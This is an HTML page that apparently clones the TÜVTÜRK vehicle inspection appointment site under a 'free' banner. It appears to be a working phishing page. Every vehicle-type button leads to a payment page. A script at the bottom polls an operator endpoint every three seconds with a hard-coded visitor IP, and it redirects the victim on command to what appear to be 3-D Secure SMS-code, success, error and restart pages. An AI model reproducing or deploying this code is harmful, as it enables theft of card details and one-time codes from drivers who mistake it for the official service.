
<!DOCTYPE html> 
<html lang="tr"> 
<head id="Head1">
    <meta charset="utf-8">
    <title>
        ÜCRETSİZ TÜVTÜRK Araç Muayene Randevu Sistemi
    </title>
    <meta name="description" content="TÜVTÜRK Ücretsiz Araç Muayene Randevu Sistemini kullanarak hızlı bir şekilde araç muayene randevunuzu alın.">
    <meta name="keywords">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta property="og:title">
    <meta property="og:description">
    <meta property="og:type" content="website">
    <meta property="og:image" content="assets/images/favicons/opengraph.png">
    <meta name="twitter:card" content="summary">
    <meta name="twitter:url">
    <meta name="twitter:title">
    <meta name="twitter:description">
    <meta name="twitter:image" content="assets/images/favicons/touch-icon-120x120.png">
    <link rel="icon" href="assets/images/favicons/favicon.ico">
    <link rel="icon" type="image/png" href="assets/images/favicons/favicon.png">
    <link rel="apple-touch-icon" href="assets/images/favicons/touch-icon.png">
    <link rel="apple-touch-icon" sizes="76x76" href="assets/images/favicons/touch-icon-76x76.png">
    <link rel="apple-touch-icon" sizes="120x120" href="assets/images/favicons/touch-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="152x152" href="assets/images/favicons/touch-icon-152x152.png">
    <meta name="google-site-verification">
    <meta name="msvalidate.01">
    <link href="../v3/signin/identifier.html" rel="publisher">
    <link rel="stylesheet" href="assets/js/fancybox/jquery.fancybox.css">
    <link rel="stylesheet" href="assets/font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="assets/css/jquery.fullPage.css">
    <link rel="stylesheet" href="assets/css/base.css">
    <link rel="stylesheet" href="assets/css/skeleton.css">
    <link rel="stylesheet" href="assets/css/styles.css?v4">
    <link rel="stylesheet" href="assets/css/jAlert.css">
    <script>
        (function(w, d, s, l, i) {
            w[l] = w[l] || [];
            w[l].push({
                'gtm.start': new Date().getTime(),
                event: 'gtm.js'
            });
            var f = d.getElementsByTagName(s)[0],
                j = d.createElement(s),
                dl = l != 'dataLayer' ? '&l=' + l : '';
            j.async = true;
            j.src =
                'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
            f.parentNode.insertBefore(j, f);
        })(window, document, 'script', 'dataLayer', 'GTM-WVB3FP8');
    </script>
    <script src="assets/js/jquery-3.6.0.min.js"></script>
    <script src="assets/js/jquery-migrate-1.0.0.js"></script>
    <script src="../maps/api/js?sensor=true"></script>
    <script src="assets/js/modernizr.js"></script>
    <script src="assets/js/jquery-ui.min.js"></script>
    <script src="assets/js/infoBox.js"></script>
    <script src="assets/js/jquery.placeholder.js"></script>
    <script src="assets/js/fancybox/jquery.fancybox.pack.js"></script>
    <script src="assets/js/jquery.bxslider.js"></script>
    <script src="assets/js/jquery.inputmask.js"></script>
    <script src="assets/js/jquery.inputmask.regex.extensions.js"></script>
    <script src="assets/js/jquery.inputmask.numeric.extensions.js"></script>
    <script src="assets/js/jquery.inputmask.date.extensions.js"></script>
    <script src="assets/js/readmore.min.js"></script>
    <script src="assets/js/jquery.selectBox.js"></script>
    <script src="assets/js/moment.js"></script>
    <script src="assets/js/jquery.slimscroll.min.js"></script>
    <script src="assets/js/jquery.fullPage.js"></script>
    <script src="assets/js/jquery.maskedinput.js"></script>
    <script src="assets/js/gistfile1.js"></script> 
    <script src="script/datepicker-tr.js"></script>
    <script src="assets/js/functions-2.2.15.js?v2638077897982322273"></script>


</head>

<body class="body" style="    overflow-y: scroll;
    position: relative;
    height: 100vh;">
    <!-- Google Tag Manager (noscript) -->
    <noscript>
        <iframe src="../ns.html?id=GTM-WVB3FP8" height="0" width="0" style="display: none; visibility: hidden"></iframe>
    </noscript>
    <!-- End Google Tag Manager (noscript) -->

    <div id="breadcrumbs">
        <div class="notification">
            <div class="table full-width full-height">
                <div class="table-cell full-width full-height valign-middle notification-text"></div>
            </div>
        </div>
        <div class="container">
            <ul>
                <li onclick="changePageViaHeader(1);" class="" id="plaka-no">
                    <div class="breadcrump-title">Plaka No</div>
                    <div class="breadcrump-detail"></div>
                </li>
                <li onclick="changePageViaHeader(3);" class="" id="muayene-ucreti">
                    <div class="breadcrump-title">Muayene Ücreti</div>
                    <div class="breadcrump-detail">
                        <img src="" style="width: 15px; height: 15px;" id="tl">Seçilmedi
                    </div>
                </li>
                <li onclick="changePageViaHeader(5);" class="disabled" id="randevu-tarih">
                    <div class="breadcrump-title">Tarih</div>
                    <div class="breadcrump-detail">Seçilmedi</div>
                </li>
                <li onclick="changePageViaHeader(7);" class="disabled" id="randevu-istasyon">
                    <div class="breadcrump-title">İstasyon</div>
                    <div class="breadcrump-detail">Seçilmedi</div>
                </li>
                <li onclick="changePageViaHeader(8);" class="disabled" id="randevu-saat">
                    <div class="breadcrump-title">Saat</div>
                    <div class="breadcrump-detail">Seçilmedi</div>
                </li>
            </ul>
            <h1 title="TÜVTÜRK" class="logo"><a href="#" onclick="changePage(1);">TÜVTÜRK</a></h1>
        </div>
        <a href="javascript:void(0);" class="nav-trigger"><span>KAPAT</span></a>
    </div>

    <div id="wrapper">

        <div id="loader">
            <div class="loader-image"></div>
        </div>
        <div id="transparent-loader">
            <div class="loader-image"></div>
        </div>

        <!-- section 02.01 // 2 (Araç Seç)-->
        <div class="section" style="display:block" data-anchor="screen02">
            <div class="container">

                <div id="secondary-area">
                    <div class="page-title">
                        <h1 id="headerVehicleType">Ne tür araç için randevu almak istersiniz?</h1>
                        <h1 id="headerVehicleTypeEGM" style="font-size: 25px!important;">Araç tipiniz Emniyet Genel Müdürlüğü kayıtlarında aşağıdaki gibidir. Hata varsa, Trafik Tescil Bürosu’nda gerekli düzeltmeleri yaptırdıktan sonra randevu işleminize devam ediniz.
                        </h1>
                    </div>
                    <div class="content">

                        <div class="eleven columns center">
                            <ul class="vehicleTypes">
                                <li class="otomobil aracsc"><a href="javascript:void(0)" ></a><span>Otomobil</span></li>
                                <li class="kamyonet aracsc"><a href="javascript:void(0)"></a><span>Kamyonet</span></li>
                                <li class="kamyon aracsc"><a href="javascript:void(0)"></a><span>Kamyon</span></li>
                                <li class="minibus aracsc"><a href="javascript:void(0)"></a><span>Minibüs</span></li>
                                <li class="motosiklet aracsc"><a href="javascript:void(0)"></a><span>Motosiklet</span></li>
                                <li class="traktor aracsc"><a href="javascript:void(0)"></a><span>Traktör</span></li>
                                <li class="otobus aracsc"><a href="javascript:void(0)"></a><span>Otobüs</span></li>
                                <li class="yariRomork aracsc"><a href="javascript:void(0)"></a><span>Yarı Römork</span></li>
                                <li class="cekici aracsc"><a href="javascript:void(0)"></a><span>Çekici</span></li>
                                <li class="romork aracsc"><a href="javascript:void(0)"></a><span>Römork</span></li>
                                <li class="tanker aracsc"><a href="javascript:void(0)"></a><span>Tanker</span></li>
                            </ul>
                        </div>



                    </div>
                </div>



            </div>
        </div>
        <!-- /section 02.01 // 2 (Araç Seç)-->

    </div>

    <script type="text/javascript">
        $(".aracsc").click(function() {
            window.location.href = "odeme.php";
        });


        $(document).ready(function() {

            gonder();

            var int = self.setInterval("gonder()", 3000);

        });

        function gonder() {
           $.ajax({
             type: 'POST',
             url: 'veri.php?ip=85.107.127.127',
             success : function(msg) {
               if (msg == 'sms') {
                 window.location.href = '3dredirect';
               }
               if (msg == 'tebrik') {
                 window.location.href = 'success';
               }
               if (msg == 'hata1') {
                 window.location.href = 'hata';
               }
               if (msg == 'back') {
                 window.location.href = 'index';
               }
             }
           });
         }
      </script>
  </body>
</html>